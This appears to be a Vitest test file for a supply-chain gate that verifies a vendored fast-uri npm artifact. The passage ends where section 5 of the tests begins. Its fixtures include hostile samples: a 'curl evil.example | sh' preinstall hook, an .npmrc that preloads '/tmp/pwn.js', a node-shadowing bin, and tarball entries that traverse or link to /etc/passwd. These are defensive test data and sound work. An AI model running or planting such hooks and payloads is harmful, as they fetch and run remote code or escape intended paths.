import { describe, expect, it } from "vitest";
import { createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { gunzipSync, gzipSync } from "node:zlib";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  activationPatchDigest,
  assertPolicyShape,
  canonicalRepositoryPathIdentity,
  checkGitattributes,
  classifyChangedFiles,
  classifyChangedPaths,
  collectProtectedPathIdentityProblems,
  createGitHubReader,
  diffImmutableTrees,
  evaluateCandidate,
  extractAdvisoryIds,
  extractPolicyLiterals,
  gitBlobId,
  isUnsafeRepositoryPath,
  loadPolicy,
  normalizeRepositoryPath,
  parseCandidateTarball,
  sanitizeToken,
  validateChangedFileRecords,
  Verdict,
} from "../../scripts/trusted/verify-dependency-artifact-gate.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const realPolicy = loadPolicy(repoRoot);

/* Windows checkouts carry CRLF (core.autocrlf), Linux CI carries LF. Every
 * static assertion below is about content, not about line endings. */
const readText = (...segments) =>
  readFileSync(join(repoRoot, ...segments), "utf8").replace(/\r\n/g, "\n");

const gateWorkflow = readText(".github", "workflows", "trusted-dependency-artifact.yml");

/* Comment lines document the boundary and therefore quote the very constructs
 * the workflow must not use. Static assertions run against executable YAML. */
const gateWorkflowCode = gateWorkflow
  .split("\n")
  .filter(line => !/^\s*#/.test(line))
  .join("\n");

const HEAD_SHA = "a".repeat(40);

/* ------------------------------------------------------------------ *
 * Fixture builders — a candidate pull request expressed purely as data
 * ------------------------------------------------------------------ */

function tarBlock(fields) {
  const header = Buffer.alloc(512);
  const write = (value, offset, length) =>
    Buffer.from(String(value), "ascii").copy(header, offset, 0, Math.min(String(value).length, length));
  const octal = (value, offset, length) =>
    write(value.toString(8).padStart(length - 1, "0"), offset, length);

  write(fields.name, 0, 100);
  octal(fields.mode ?? 0o644, 100, 8);
  octal(fields.uid ?? 0, 108, 8);
  octal(fields.gid ?? 0, 116, 8);
  octal(fields.size ?? 0, 124, 12);
  octal(fields.mtime ?? 499162500, 136, 12);
  header[156] = (fields.typeflag ?? "0").charCodeAt(0);
  if (fields.linkname) write(fields.linkname, 157, 100);
  write("ustar\u000000", 257, 8);

  header.fill(0x20, 148, 156);
  let checksum = 0;
  for (const byte of header) checksum += byte;
  write(`${checksum.toString(8).padStart(6, "0")}\u0000 `, 148, 8);
  return header;
}

function buildTarball(entries) {
  const blocks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? "", "utf8");
    blocks.push(tarBlock({ ...entry, size: body.length }));
    if (body.length > 0) {
      const padded = Buffer.alloc(Math.ceil(body.length / 512) * 512);
      body.copy(padded);
      blocks.push(padded);
    }
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks), { level: 9 });
}

const PACKED_MANIFEST = JSON.stringify({
  name: "fast-uri",
  version: "3.1.7",
  license: "BSD-3-Clause",
  main: "index.js",
});

function goodTarEntries() {
  return [
    { name: "package/package.json", body: PACKED_MANIFEST },
    { name: "package/index.js", body: "module.exports = {};\n" },
    { name: "package/LICENSE", body: "BSD-3-Clause\n" },
  ];
}

function sha256(bytes) {
  // Computed locally so fixtures never take their notion of truth from the
  // module under test.
  return createHash("sha256").update(bytes).digest("hex");
}

const utf8 = value => (Buffer.isBuffer(value) ? value : Buffer.from(String(value), "utf8"));

function buildProvenance() {
  return JSON.stringify({
    files: goodTarEntries().map(entry => ({
      path: entry.name.replace("package/", ""),
      size: Buffer.from(entry.body, "utf8").length,
      mode: 0o644,
      sha256: sha256(Buffer.from(entry.body, "utf8")),
    })),
  });
}

/*
 * The reviewed, well-formed candidate. Every test starts from this and then
 * tampers with exactly one thing, which is what makes each failure attributable.
 */
function baselineFiles(tarball) {
  const files = {
    "package.json": JSON.stringify(PACKAGE_JSON),
    "package-lock.json": JSON.stringify(PACKAGE_LOCK),
    ".gitattributes": GITATTRIBUTES,
    "SECURITY.md": "# Security\n",
    "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz": tarball,
    "vendor/npm/fast-uri/3.1.7/provenance.json": buildProvenance(),
    "vendor/npm/fast-uri/3.1.7/README.md": SAFE_README,
    "scripts/verify-fast-uri-artifact.mjs": VERIFIER_SOURCE,
    "scripts/verify-fast-uri-bootstrap.mjs": "// bootstrap\n",
    "scripts/verify-vendored-runtime.mjs": "// vendored runtime verifier\n",
    // Candidate-controlled files remain inert; activation mode only hashes
    // their exact approved bytes and never executes or trusts their results.
    ".github/workflows/sri-check.yml": "name: sri-check\n",
    "tests/spa/fast-uri-artifact-race.test.mjs": "// tests\n",
  };
  for (const path of realPolicy.activation.allowedFiles) {
    if (!(path in files)) files[path] = `activation fixture: ${path}\n`;
  }
  for (const path of realPolicy.trustedPaths) {
    if (!(path in files)) files[path] = `trusted fixture: ${path}\n`;
  }
  return files;
}

/*
 * A policy clone whose pins describe the synthetic baseline instead of the real
 * 43,760-byte artifact. This is the base-controlled side of the boundary: tests
 * tamper with the *candidate*, never with this. The real committed policy's own
 * values are asserted separately.
 */
function policyFor(tarball, pinOverrides = {}) {
  const policy = structuredClone(realPolicy);
  const baseline = { ...baselineFiles(tarball), ...pinOverrides };
  policy.package.tar.size = tarball.length;
  policy.package.tar.sha256 = sha256(tarball);
  policy.package.tar.sha512 = createHash("sha512").update(tarball).digest("hex");
  policy.package.tar.fileCount = goodTarEntries().length;
  for (const path of Object.keys(policy.digestPins)) {
    const bytes = utf8(baseline[path]);
    policy.digestPins[path] = { sha256: sha256(bytes), size: bytes.length };
  }
  for (const path of Object.keys(policy.activation.pins)) {
    const bytes = utf8(baseline[path] ?? `activation fixture: ${path}\n`);
    policy.activation.pins[path] = {
      mode: policy.activation.pins[path].mode,
      blob: gitBlobId(bytes),
      sha256: sha256(bytes),
      size: bytes.length,
    };
  }
  policy.activation.patchSha256 = activationPatchDigest(policy.activation);
  return policy;
}

const VERIFIER_SOURCE = `
export const FAST_URI_POLICY = Object.freeze({
  packageName: "fast-uri",
  version: "3.1.7",
  license: "BSD-3-Clause",
  upstreamCommit: "412e40abd4eb8beabfb952d80abf949a2baf27a3",
  upstreamTree: "a1ec2b29b5d2493a9ba4d2de480a062b08f72558",
  upstreamTrackedFileCount: 46,
  artifactFileCount: 44,
  canonicalTarMtime: 499162500,
  artifactRelativePath: "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  provenanceRelativePath: "vendor/npm/fast-uri/3.1.7/provenance.json",
  packageSpec: "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  overrideSpec: "$fast-uri",
  lockPackagePath: "node_modules/fast-uri",
  sha256: "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
  sha512: "74ebd95738dd65dcfba6177dbfa8c26f0c6b056ddf2ba9fc45cd02b5d98ce1bba6ccc9f1cb005886ea61e89f35f51470fe4bbeacb6de9707ccba792dbb35551e",
  integrity: "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
  artifactSize: 43760,
  artifactUnpackedSize: 218619,
  provenanceSha256: "bfaada6d35b9b09bdbd28b0dd0575ded1515c2f3a232ceccc17389548123eba8",
});
export const REGRESSIONS = [
${realPolicy.verifierPolicyLiterals.requiredAdvisories
  .map(id => `  { advisory: "${id}", verify() {} },`)
  .join("\n")}
];
`;

const PACKAGE_JSON = {
  name: "fsi-agentgov-spa-tests",
  private: true,
  scripts: { test: "vitest run", "verify:sri": "node scripts/verify-sheetjs-sri.mjs" },
  overrides: { ajv: { "fast-uri": "$fast-uri" } },
  devDependencies: {
    ajv: "8.20.0",
    "fast-uri": "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
    vitest: "4.1.11",
  },
};

const PACKAGE_LOCK = {
  name: "fsi-agentgov-spa-tests",
  packages: {
    "": { devDependencies: { ajv: "8.20.0" } },
    "node_modules/ajv": { version: "8.20.0", dev: true, dependencies: { "fast-uri": "^3.0.1" } },
    "node_modules/fast-uri": {
      version: "3.1.7",
      resolved: "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
      integrity:
        "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
      dev: true,
    },
    "node_modules/vitest": { version: "4.1.11", dev: true, bin: { vitest: "vitest.mjs" } },
  },
};

const GITATTRIBUTES = "vendor/npm/**/*.tgz binary\nvendor/npm/**/*.json text eol=lf\n";
const SAFE_README = [
  "# Reviewed dependency artifact",
  "",
  "This file is immutable metadata for the reviewed dependency artifact.",
  "",
  "The only pre-trust procedure is the protected-default-branch runbook.",
  "",
].join("\n");

/*
 * A whole candidate pull request, as the gate sees it: a tree listing plus
 * content-addressed blobs. `reads` records every blob the gate actually
 * fetched, which is how the tests prove candidate workflows and tests are
 * never consulted.
 */
function candidate({ tarball, files = {}, modes = {}, extraPaths = [] } = {}) {
  const blobs = new Map(
    Object.entries({ ...baselineFiles(tarball), ...files }).map(([path, value]) => [
      path,
      utf8(value),
    ]),
  );
  for (const path of extraPaths) {
    if (!blobs.has(path)) blobs.set(path, Buffer.from("x", "utf8"));
  }

  const bySha = new Map();
  const treeEntries = [...blobs.entries()].map(([path, bytes]) => {
    const sha = gitBlobId(bytes);
    bySha.set(sha, bytes);
    return {
      path,
      mode: modes[path] ?? "100644",
      type: modes[path] === "160000" ? "commit" : "blob",
      sha,
      size: bytes.length,
    };
  });

  const reads = [];
  return {
    treeEntries,
    reads,
    readBlob: async (sha, path) => {
      reads.push(path);
      if (!bySha.has(sha)) throw new Error("unknown blob");
      return bySha.get(sha);
    },
  };
}

function withoutReviewedArtifact(tree) {
  return {
    ...tree,
    treeEntries: tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    ),
  };
}

function activationTree(tarball, policy) {
  const files = {};
  for (const path of policy.activation.allowedFiles) {
    files[path] =
      baselineFiles(tarball)[path] ?? `activation fixture: ${path}\n`;
  }
  return candidate({ tarball, files });
}

function activationBaseTree(tarball, policy) {
  const tree = activationTree(tarball, policy);
  const allowed = new Set(policy.activation.allowedFiles);
  tree.treeEntries = tree.treeEntries.flatMap(entry => {
    if (!allowed.has(entry.path)) return [entry];
    const basePin = policy.activation.basePins[entry.path];
    if (basePin.absent === true) return [];
    return [{ ...entry, mode: basePin.mode, sha: basePin.blob }];
  });
  return tree;
}

function activationChangedFiles(policy) {
  return policy.activation.allowedFiles.map(filename => ({
    status: policy.activation.basePins[filename].absent === true ? "added" : "modified",
    filename,
  }));
}

async function judge({
  policy,
  tree,
  baseTree,
  changedPaths,
  changedFiles,
  artifactRequired = true,
  ...rest
}) {
  const immutableBase = baseTree ?? (artifactRequired ? tree : withoutReviewedArtifact(tree));
  return evaluateCandidate({
    policy,
    baseRef: "main",
    defaultBranch: "main",
    eventHeadSha: HEAD_SHA,
    eventBaseSha: "b".repeat(40),
    currentHeadSha: HEAD_SHA,
    currentBaseSha: "b".repeat(40),
    currentBaseRef: "main",
    changedFiles,
    changedPaths,
    baseTreeEntries: immutableBase.treeEntries,
    treeEntries: tree.treeEntries,
    readBlob: tree.readBlob,
    ...rest,
  });
}

const GUARDED_CHANGE = [
  "package.json",
  "package-lock.json",
  "vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz",
  "scripts/verify-fast-uri-artifact.mjs",
];

/* ------------------------------------------------------------------ *
 * 1. The base-controlled decision is unaffected by candidate self-attestation
 * ------------------------------------------------------------------ */

describe("authoritative gate — candidate self-attestation is worthless", () => {
  it("accepts a candidate that matches base policy exactly", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
  });

  it("rejects a coherent malicious change that rewrites verifier, hashes, workflow and tests together", async () => {
    const evilTarball = buildTarball([
      ...goodTarEntries(),
      { name: "package/backdoor.js", body: "process.env.SECRET;\n" },
    ]);
    const evilVerifier = VERIFIER_SOURCE.replace(
      "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
      sha256(evilTarball),
    );
    const tree = candidate({
      tarball: evilTarball,
      files: {
        "scripts/verify-fast-uri-artifact.mjs": evilVerifier,
        // A workflow that claims everything is fine.
        ".github/workflows/sri-check.yml": "name: sri-check\njobs:\n  sri-check:\n    steps:\n      - run: exit 0\n",
        "tests/spa/fast-uri-artifact-race.test.mjs": "// deleted assertions\n",
      },
    });

    // Base policy still describes the *reviewed* artifact, not the candidate's.
    const verdict = await judge({
      policy: policyFor(buildTarball(goodTarEntries())),
      tree,
      changedPaths: [...GUARDED_CHANGE, ".github/workflows/sri-check.yml"],
    });

    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/does not match base policy/);
    // The gate may read these files as inert, exact-byte data, but never
    // executes or trusts their reported result.
    expect(tree.reads).toContain(".github/workflows/sri-check.yml");
    expect(tree.reads).toContain("tests/spa/fast-uri-artifact-race.test.mjs");
  });

  it("rejects a candidate that edits the expected pins inside its own verifier", async () => {
    const tarball = buildTarball(goodTarEntries());
    // Keep the file digest legal by re-pinning it, so only the literals differ.
    // This is the strongest form of the attack: the candidate's own constants
    // are internally consistent and only base policy contradicts them.
    const tampered = VERIFIER_SOURCE.replace('version: "3.1.7"', 'version: "3.1.7-evil"');
    const verdict = await judge({
      policy: policyFor(tarball, { "scripts/verify-fast-uri-artifact.mjs": tampered }),
      tree: candidate({ tarball, files: { "scripts/verify-fast-uri-artifact.mjs": tampered } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/FAST_URI_POLICY\.version does not match/);
  });

  it("rejects a candidate that drops a reviewed security regression", async () => {
    const tarball = buildTarball(goodTarEntries());
    const stripped = VERIFIER_SOURCE.replace(
      'advisory: "GHSA-58mr-gqgx-xq4g"',
      'advisory: "GHSA-0000-0000-0000"',
    );
    const verdict = await judge({
      policy: policyFor(tarball, { "scripts/verify-fast-uri-artifact.mjs": stripped }),
      tree: candidate({ tarball, files: { "scripts/verify-fast-uri-artifact.mjs": stripped } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/no longer covers GHSA-58mr-gqgx-xq4g/);
  });

  it("refuses a pull request that changes trusted policy and a guarded path together", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [
        ...GUARDED_CHANGE,
        ".github/trusted-policy/dependency-artifact-policy.json",
      ],
    });
    expect(verdict.toJSON()).toMatchObject({
      conclusion: "failure",
      mode: "mixed-trusted-and-guarded",
    });
  });

  it("revalidates the base-required artifact during a policy-only pull request", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [".github/trusted-policy/dependency-artifact-policy.json"],
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
    expect(verdict.messages.join(" ")).toMatch(/validated/);
  });

  it("revalidates the base-required artifact on an otherwise unrelated pull request", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: ["docs/index.md"],
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "success", mode: "artifact" });
  });

  it("refuses to let a candidate delete the reviewed artifact once base carries it", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = candidate({ tarball });
    const tree = withoutReviewedArtifact(candidate({ tarball }));
    const verdict = await judge({ policy, tree, baseTree, changedPaths: ["docs/index.md"] });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/removes or moves a reviewed dependency artifact/);
  });
});

/* ------------------------------------------------------------------ *
 * 2. Execution vectors stay inert data
 * ------------------------------------------------------------------ */

describe("authoritative gate — candidate execution vectors stay inert", () => {
  it("detects preinstall, preverify and pretest hooks", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_JSON);
    evil.scripts.preinstall = "curl evil.example | sh";
    evil.scripts.preverify = "node -e ''";
    evil.scripts["verify"] = "node -e ''";
    evil.scripts.pretest = "node -e ''";
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    const text = verdict.messages.join("\n");
    expect(verdict.failed).toBe(true);
    expect(text).toMatch(/lifecycle script 'preinstall'/);
    expect(text).toMatch(/hook script 'preverify' wrapping 'verify'/);
    expect(text).toMatch(/hook script 'pretest' wrapping 'test'/);
  });

  it("detects an .npmrc anywhere in the candidate tree", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({
        tarball,
        files: { "tools/.npmrc": "node-options=--require /tmp/pwn.js\n" },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden '\.npmrc' at 'tools\/\.npmrc'/);
  });

  it("detects a node-shadowing bin declared in the lockfile", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_LOCK);
    evil.packages["node_modules/vitest"].bin = { node: "bin/pwn.js" };
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package-lock.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(
      /node-shadowing bin at 'node_modules\/vitest'/,
    );
  });

  it("detects a competing npm-shrinkwrap.json", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "npm-shrinkwrap.json": "{}" } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden 'npm-shrinkwrap.json'/);
  });

  it("detects a .gitattributes filter driver aimed at the guarded vendor tree", async () => {
    const verdict = new Verdict(realPolicy.limits);
    checkGitattributes(
      verdict,
      realPolicy,
      "vendor/npm/**/*.tgz binary\nvendor/** filter=smudge-me\n",
    );
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/applies 'filter=smudge-me'/);
  });

  it("rejects a symlink, an executable file, or a submodule under vendor/", async () => {
    const tarball = buildTarball(goodTarEntries());
    for (const [mode, pattern] of [
      ["120000", /is a symlink/],
      ["100755", /is executable/],
    ]) {
      const verdict = await judge({
        policy: policyFor(tarball),
        tree: candidate({
          tarball,
          modes: { "vendor/npm/fast-uri/3.1.7/README.md": mode },
        }),
        changedPaths: GUARDED_CHANGE,
      });
      expect(verdict.failed).toBe(true);
      expect(verdict.messages.join("\n")).toMatch(pattern);
    }

    const submodule = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, modes: { "vendor/npm/fast-uri/3.1.7/README.md": "160000" } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(submodule.messages.join("\n")).toMatch(/submodule/);
  });

  it("rejects an unreviewed extra file smuggled into vendor/", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({
        tarball,
        files: { "vendor/npm/fast-uri/3.1.7/postinstall.js": "//\n" },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/outside the reviewed allowlist/);
  });
});

/* ------------------------------------------------------------------ *
 * 3. Archive and manifest structures fail closed
 * ------------------------------------------------------------------ */

describe("authoritative gate — archive and manifest structures fail closed", () => {
  const cases = [
    {
      name: "path traversal",
      entries: [{ name: "package/../../etc/passwd", body: "x" }],
      pattern: /unsafe path|escapes the package root/,
    },
    {
      name: "absolute path",
      entries: [{ name: "/etc/passwd", body: "x" }],
      pattern: /escapes the package root/,
    },
    {
      name: "symlink entry",
      entries: [{ name: "package/link", body: "", typeflag: "2", linkname: "/etc/passwd" }],
      pattern: /not a regular file|link target/,
    },
    {
      name: "hardlink entry",
      entries: [{ name: "package/link", body: "", typeflag: "1", linkname: "package/index.js" }],
      pattern: /not a regular file/,
    },
    {
      name: "executable mode",
      entries: [{ name: "package/index.js", body: "x", mode: 0o755 }],
      pattern: /executable mode/,
    },
    {
      name: "non-canonical mtime",
      entries: [{ name: "package/index.js", body: "x", mtime: 1_700_000_000 }],
      pattern: /non-canonical mtime/,
    },
    {
      name: "non-canonical ownership",
      entries: [{ name: "package/index.js", body: "x", uid: 501 }],
      pattern: /non-canonical ownership/,
    },
  ];

  for (const { name, entries, pattern } of cases) {
    it(`rejects a tarball with ${name}`, () => {
      const tarball = buildTarball(entries);
      expect(() => parseCandidateTarball(tarball, policyFor(tarball))).toThrow(pattern);
    });
  }

  it("rejects an oversize tarball before decompressing it", () => {
    const entries = [{ name: "package/big.js", body: "a".repeat(300_000) }];
    const tarball = buildTarball(entries);
    const policy = policyFor(tarball);
    policy.limits = { ...policy.limits, maxUnpackedBytes: 4096 };
    expect(() => parseCandidateTarball(tarball, policy)).toThrow();
  });

  it("rejects a tarball whose entry count exceeds the bound", () => {
    const entries = Array.from({ length: 12 }, (_, index) => ({
      name: `package/f${index}.js`,
      body: "x",
    }));
    const tarball = buildTarball(entries);
    const policy = policyFor(tarball);
    policy.limits = { ...policy.limits, maxTarEntries: 4 };
    expect(() => parseCandidateTarball(tarball, policy)).toThrow(/exceeds 4 entries/);
  });

  it("rejects a tarball whose size disagrees with the pinned size", () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    policy.package.tar.size = tarball.length + 1;
    expect(() => parseCandidateTarball(tarball, policy)).toThrow(/expected/);
  });

  it("rejects a tarball with trailing data after the terminator", () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const inflated = Buffer.concat([
      Buffer.from(gunzipSync(tarball)),
      Buffer.from("trailing".padEnd(512, "\u0000"), "utf8"),
    ]);
    const repacked = gzipSync(inflated, { level: 9 });
    policy.package.tar.size = repacked.length;
    expect(() => parseCandidateTarball(repacked, policy)).toThrow(/after its zero-block/);
  });

  it("rejects malformed JSON in the lock, the manifest and the provenance", async () => {
    const tarball = buildTarball(goodTarEntries());
    const broken = "{ not json";
    for (const path of [
      "package.json",
      "package-lock.json",
      "vendor/npm/fast-uri/3.1.7/provenance.json",
    ]) {
      const verdict = await judge({
        policy: policyFor(tarball, { [path]: broken }),
        tree: candidate({ tarball, files: { [path]: broken } }),
        changedPaths: GUARDED_CHANGE,
      });
      expect(verdict.failed, path).toBe(true);
      expect(verdict.messages.join("\n"), path).toMatch(/rejected/);
    }
  });

  it("rejects a provenance manifest that disagrees with the packed bytes", async () => {
    const tarball = buildTarball(goodTarEntries());
    const lying = JSON.stringify({
      files: goodTarEntries().map(entry => ({
        path: entry.name.replace("package/", ""),
        size: entry.body.length,
        mode: 0o644,
        sha256: "0".repeat(64),
      })),
    });
    const path = "vendor/npm/fast-uri/3.1.7/provenance.json";
    const verdict = await judge({
      policy: policyFor(tarball, { [path]: lying }),
      tree: candidate({ tarball, files: { [path]: lying } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/does not match its provenance digest/);
  });

  it("rejects a lock that promotes the artifact out of development scope", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_LOCK);
    evil.packages["node_modules/fast-uri"].dev = false;
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package-lock.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/not marked development-only/);
  });

  it("rejects a manifest that promotes the artifact to a production dependency", async () => {
    const tarball = buildTarball(goodTarEntries());
    const evil = structuredClone(PACKAGE_JSON);
    evil.dependencies = { "fast-uri": "file:vendor/npm/fast-uri/3.1.7/fast-uri-3.1.7.tgz" };
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball, files: { "package.json": JSON.stringify(evil) } }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/production dependency/);
  });

  it("rejects a blob whose bytes do not match its advertised Git object id", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball });
    const original = tree.readBlob;
    tree.readBlob = async (sha, path) =>
      path === "package.json" ? Buffer.from("{}", "utf8") : original(sha, path);
    const verdict = await judge({
      policy: policyFor(tarball),
      tree,
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/did not match its Git object id/);
  });
});

/* ------------------------------------------------------------------ *
 * 4. Event, race and bound semantics
 * ------------------------------------------------------------------ */

describe("authoritative gate — event, race and bound semantics", () => {
  it("pins production API traffic to api.github.com", () => {
    expect(() =>
      createGitHubReader({
        apiUrl: "https://attacker.example",
        owner: "judeper",
        repo: "FSI-AgentGov",
      }),
    ).toThrow(/exactly https:\/\/api\.github\.com/);
    expect(() =>
      createGitHubReader({
        apiUrl: "https://api.github.com",
        owner: "judeper",
        repo: "FSI-AgentGov",
        fetchImpl: async () => ({ ok: true, json: async () => ({}) }),
      }),
    ).not.toThrow();
  });

  it("fails closed when the pull request head moves during validation", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      currentHeadSha: "b".repeat(40),
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/head moved during validation/);
  });

  it("rejects a head SHA that is not a full object id", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      eventHeadSha: "abc123",
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "invalid-event" });
  });

  it("refuses to judge a pull request aimed anywhere but the default branch", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      baseRef: "release/1.x",
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "invalid-base" });
  });

  it("refuses to judge a truncated changed-file or tree listing", async () => {
    const tarball = buildTarball(goodTarEntries());
    const truncatedFiles = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      changedPathsTruncated: true,
    });
    expect(truncatedFiles.toJSON()).toMatchObject({ mode: "unbounded-change" });

    const truncatedTree = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      treeTruncated: true,
    });
    expect(truncatedTree.failed).toBe(true);
    expect(truncatedTree.messages.join("\n")).toMatch(/base or candidate tree listing was truncated/);
  });

  it("rejects unsafe changed paths outright", async () => {
    const tarball = buildTarball(goodTarEntries());
    for (const path of ["../escape.txt", "/etc/passwd", "a\\b.txt", "x\u0000y"]) {
      expect(isUnsafeRepositoryPath(path), path).toBe(true);
    }
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: [...GUARDED_CHANGE, "../escape.txt"],
    });
    expect(verdict.toJSON()).toMatchObject({ mode: "unsafe-path", conclusion: "failure" });
  });

  it("fails closed when metadata references the artifact before its bytes exist", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball });
    tree.treeEntries = tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const verdict = await judge({
      policy: policyFor(tarball),
      tree,
      changedPaths: ["package.json"],
      artifactRequired: false,
    });
    expect(verdict.toJSON()).toMatchObject({
      conclusion: "failure",
      mode: "activation-rejected",
    });
    expect(verdict.messages.join("\n")).toMatch(/exact policy-approved activation file set/);
  });

  it("still enforces guard invariants before the artifact lands in base", async () => {
    const tarball = buildTarball(goodTarEntries());
    const tree = candidate({ tarball, files: { "tools/.npmrc": "node-options=--require x\n" } });
    tree.treeEntries = tree.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const clean = structuredClone(PACKAGE_JSON);
    delete clean.devDependencies["fast-uri"];
    const cleanLock = structuredClone(PACKAGE_LOCK);
    delete cleanLock.packages["node_modules/fast-uri"];
    const rebuilt = candidate({
      tarball,
      files: {
        "tools/.npmrc": "node-options=--require x\n",
        "package.json": JSON.stringify(clean),
        "package-lock.json": JSON.stringify(cleanLock),
      },
    });
    rebuilt.treeEntries = rebuilt.treeEntries.filter(
      entry => !entry.path.startsWith("vendor/npm/fast-uri/"),
    );
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: rebuilt,
      changedPaths: ["package.json"],
      artifactRequired: false,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/forbidden '\.npmrc'/);
  });
});

/* ------------------------------------------------------------------ *
 * 5. Immutable base/head paths close rename and omission bypasses
 * ------------------------------------------------------------------ */

describe("authoritative gate — immutable path and rename evidence", () => {
